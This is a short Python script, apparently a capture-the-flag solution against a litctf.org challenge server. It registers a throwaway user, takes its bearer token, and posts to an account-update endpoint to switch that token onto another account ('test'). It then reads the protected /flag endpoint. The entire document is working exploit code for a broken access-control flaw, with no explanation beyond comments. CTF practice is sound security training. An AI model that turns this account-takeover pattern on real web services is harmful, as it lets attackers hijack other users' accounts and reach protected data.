import requests

API = 'http://litctf.org:31783'

# Create User
dummy_user = {'username': 'Yada', 'password': 'Nada'}
resp = requests.post(API+'/signup', data=dummy_user)
print(f'[+] Created Dummy User...')

# Get Token
resp = requests.post(API+'/login', data=dummy_user)
token = resp.json()['token']
print(f'[+] Token: {token}')

# Change Your Token Username To "sus" User
admin = {'username': 'test', 'password': 'LETMEIN'}
header = {'Authorization': f'Bearer {token}'}
resp = requests.post(API+'/account/update', headers=header, data=admin)
print(f'[+] Updating Token Username...')

# Get Flag
resp = requests.get(API+'/flag', headers=header)
print(f'[+] Profit: {resp.text}')